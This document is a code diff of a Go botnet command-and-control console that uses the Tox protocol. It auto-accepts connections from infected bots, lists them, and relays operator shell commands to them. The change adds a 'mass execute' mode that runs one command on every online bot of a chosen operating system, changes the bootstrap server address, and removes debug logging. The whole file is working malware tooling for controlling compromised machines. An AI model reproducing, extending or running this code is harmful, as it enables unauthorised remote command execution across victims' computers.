@@ -19,11 +19,10 @@ func init() {
 }
 
 var server = []interface{}{
-	"205.185.116.116", uint16(33445), "A179B09749AC826FF01F37A9613F6B57118AE014D4196A0E1105A98F93A54702",
+	"85.172.30.117", uint16(33445), "8E7D0B859922EF569298B4D261A8CCB5FEA14FB91ED412A7603A585A25698832",
 }
 
 var fname = "./server.data"
-var debug = false
 var nickPrefix = "Odin"
 var statusText = "Revered immortal."
 
@@ -45,11 +44,13 @@ var colorBlack = "\033[30m"
 var colorGrey = "\033[31m"
 
 // ListBots (Return text bool, id return type)
-func ListBots(t *tox.Tox, id string) []uint32 {
-	
+func ListBots(t *tox.Tox, print string) []uint32 {
+
+	// Pull bots
 	fv := t.SelfGetFriendList()
-	if id != "none" {
-		if id == "all" {
+	// If print doesn't equal none. Check if it should print all or the online bots.
+	if print != "none" {
+		if print == "all" {
 			fmt.Println(string(colorPurple), "\n\tBots:", string(colorReset))
 			fmt.Println(string(colorBlue))
 			for _, fno := range fv {
@@ -60,7 +61,7 @@ func ListBots(t *tox.Tox, id string) []uint32 {
 				fmt.Println("\t\t[ ID:", fno, "]", fid)
 			}
 			fmt.Println(string(colorReset))
-		} else if id == "online" {
+		} else if print == "online" {
 			if len(online) > 0 {
 				fmt.Println(string(colorPurple), "\n\tOnline bots:", string(colorReset))
 				fmt.Println(string(colorGreen))
@@ -124,7 +125,7 @@ func showC2(toxid string) {
 	fmt.Println("")
 }
 
-// helpCommands
+// helpCommands - Print commands with examples
 func helpCommands(help string) {
 	fmt.Println(string(colorPurple), "\n\tExamples:", help, string(colorReset))
 	if help == "" {
@@ -135,16 +136,17 @@ func helpCommands(help string) {
 		fmt.Println(string(colorReset))
 	} else if help == "bots" {
 		fmt.Println(string(colorYellow))
-		fmt.Println("\t\tbots list all - List all bots: [ID] ToxID")
-		fmt.Println("\t\tbots list amount - List amount of bots")
+		fmt.Println("\t\tbots list all - List all bots")
+		fmt.Println("\t\tbots list amount - List total amount of bots")
 		fmt.Println("\t\tbots list online - List online bots")
-		fmt.Println("\t\tbots interact <id> os - Return operating system")
 		fmt.Println("\t\tbots interact <id> ! ls -lah - Execute shell command")
+		fmt.Println("\t\tbots interact * ! ls -lah - Mass execute")
 		fmt.Println(string(colorReset))
 	}
 }
 
 func main() {
+
 	opt := tox.NewToxOptions()
 	if tox.FileExist(fname) {
 		data, err := ioutil.ReadFile(fname)
@@ -155,6 +157,7 @@ func main() {
 			opt.Savedata_type = tox.SAVEDATA_TYPE_TOX_SAVE
 		}
 	}
+
 	opt.Tcp_port = 33445
 	var t *tox.Tox
 	for i := 0; i < 5; i++ {
@@ -168,16 +171,11 @@ func main() {
 
 	r, err := t.Bootstrap(server[0].(string), server[1].(uint16), server[2].(string))
 	r2, err := t.AddTcpRelay(server[0].(string), server[1].(uint16), server[2].(string))
-	if debug {
+	if err != nil {
 		log.Println("bootstrap:", r, err, r2)
 	}
 
-	pubkey := t.SelfGetPublicKey()
-	seckey := t.SelfGetSecretKey()
 	toxid := t.SelfGetAddress()
-	if debug {
-		log.Println("keys:", pubkey, seckey, len(pubkey), len(seckey))
-	}
 
 	defaultName := t.SelfGetName()
 	humanName := nickPrefix + toxid[0:5]
@@ -185,27 +183,15 @@ func main() {
 		t.SelfSetName(humanName)
 	}
 	humanName = t.SelfGetName()
-	if debug {
-		log.Println(humanName, defaultName, err)
-	}
 
 	defaultStatusText, err := t.SelfGetStatusMessage()
 	if defaultStatusText != statusText {
 		t.SelfSetStatusMessage(statusText)
 	}
-	if debug {
-		log.Println(statusText, defaultStatusText, err)
-	}
 
-	sz := t.GetSavedataSize()
-	sd := t.GetSavedata()
-	if debug {
-		log.Println("savedata:", sz, t)
-		log.Println("savedata", len(sd), t)
-	}
 	err = t.WriteSavedata(fname)
-	if debug {
-		log.Println("savedata write:", err)
+	if err != nil {
+		log.Println(err)
 	}
 
 	// Show C2 address
@@ -219,43 +205,59 @@ func main() {
 
 	// Console for commands
 	go func() {
+
 		reader := bufio.NewReader(os.Stdin)
+
 		for {
 			fmt.Print(string(colorGreen), "\n-> ", string(colorReset), string(colorGrey))
 			text, _ := reader.ReadString('\n')
 			text = strings.Replace(text, "\n", "", -1)
 
+			// Append every input to the commands array
 			commandHistory = append(commandHistory, text)
 
+			// If input equals commands, print each command
 			if text == "commands" {
 				fmt.Println(string(colorPurple), "\n\n\tHistory:", string(colorReset))
 				for _, command := range commandHistory {
 					fmt.Println(string(colorYellow), "\t\t", command, string(colorReset))
 				}
 			}
-
 			fmt.Println(string(colorReset))
+
+			// If the command starts with bots
 			if strings.HasPrefix(text, "bots") {
+				// Split command every space and turn into array.
 				args := strings.Fields(text)
+				// If there is more or 4 arguments in the command.
 				if len(args) >= 3 {
+					// If the 2nd argument in the command is list.
 					if args[1] == "list" {
+						// If the 3rd argument is all. Print all bots.
 						if args[2] == "all" {
 							fv = ListBots(t, "all")
+							// If the 3rd argument is amount. Print amount of bots.
 						} else if args[2] == "amount" {
 							fv = ListBots(t, "none")
 							fmt.Println(string(colorPurple))
 							fmt.Println("\tTotal bots:", len(fv))
 							fmt.Println(string(colorReset))
+							// If the 3rd argument is online. Print online bots.
 						} else if args[2] == "online" {
 							fv = ListBots(t, "online")
 						}
+						// If the 2nd argument in the command is interact.
 					} else if args[1] == "interact" {
-						if len(args) >= 3 {
+						// If the ID isn't all. Then execute for that specific ID.
+						if args[2] != "*" {
+							// Convert ID to int
 							botid, err := strconv.Atoi(args[2])
 							if err != nil {
 								log.Println(err)
 							}
+							// If the bot ID is in the the bots list.
 							if botid < len(fv) {
+								// Send the command to the bot.
 								commands := args[3:len(args)]
 								command := strings.Join(commands, " ")
 								err = SendMessage(t, fv[botid], command)
@@ -263,35 +265,53 @@ func main() {
 									fmt.Println("Bot offline...")
 								}
 							}
+						} else {
+							// Mass execute command
+							for _, online := range online {
+								values := strings.Fields(online)
+								fno, err := strconv.Atoi(values[0])
+								if err != nil {
+									log.Println(err)
+								}
+								if err != nil {
+									log.Println(err)
+								}
+								os := values[1]
+								commands := args[4:len(args)]
+								command := strings.Join(commands, " ")
+								if string(args[3]) == os {
+									SendMessage(t, fv[fno], command)
+								}
+							}
 						}
 					}
 				} else {
+					// If there was not enough arguments, then show the examples.
 					helpCommands("bots")
 				}
-
+				// If the command is help
 			} else if text == "help" {
+				// Show all help commands
 				helpCommands("")
 			} else if text == "clear" {
+				// Clear console
 				fmt.Print("\033[H\033[2J")
 				showC2(toxid)
 			} else if text == "exit" {
+				// Exit C2
 				fmt.Println("\tGoodbye!")
 				os.Exit(1)
 			}
 		}
 	}()
 
-	if debug {
-		log.Println("add friends:", len(fv))
-	}
-
 	// Auto accept
 	t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {
-		//fmt.Println("New connection", friendId, message)
+		// When a bot adds the C2. Add them back with no message.
 		num, err := t.FriendAddNorequest(friendId)
 		fv = ListBots(t, "none")
 
-		if debug {
+		if err != nil {
 			log.Println("on friend request:", num, err)
 		}
 		if num < 100000 {
@@ -301,23 +321,25 @@ func main() {
 
 	// On message
 	t.CallbackFriendMessage(func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
-		if debug {
-			log.Println("on friend message:", friendNumber, message)
-		}
+		// If incoming message starts with update
 		if strings.HasPrefix(message, "update") {
-
-			values := strings.Fields(message)
-
+			// Split the incoming update message
+			args := strings.Fields(message)
+			// Return friendNumber as string
 			str := fmt.Sprint(friendNumber)
-
-			foundBot := str + " " + values[1]
-
+			// Make a string with friendNumber and operating system
+			foundBot := str + " " + args[1]
+			// Look for that string in the online array
 			_, found := Find(online, foundBot)
+			// If it cannot be found
 			if !found {
+				// Append the bot to the online array
 				online = append(online, foundBot)
 			}
+
 		} else {
-			fmt.Print("Output:\n\n", message, string(colorGreen), "\n\n-> ", string(colorRed))
+			// If the response wasn't update. Print the response.
+			fmt.Print("Output:", friendNumber, "\n\n", message, string(colorGreen), "\n\n-> ", string(colorRed))
 		}
 
 	}, nil)
@@ -329,27 +351,10 @@ func main() {
 	for !shutdown {
 		iv := t.IterationInterval()
 		if iv != itval {
-			if debug {
-				if itval-iv > 20 || iv-itval > 20 {
-					log.Println("tox itval changed:", itval, iv)
-				}
-			}
 			itval = iv
 		}
 
 		t.Iterate()
-		status := t.SelfGetConnectionStatus()
-		if loopc%5500 == 0 {
-			if status == 0 {
-				if debug {
-					fmt.Print(".")
-				}
-			} else {
-				if debug {
-					fmt.Print(status, ",")
-				}
-			}
-		}
 		loopc++
 		time.Sleep(1000 * 50 * time.Microsecond)
 	}
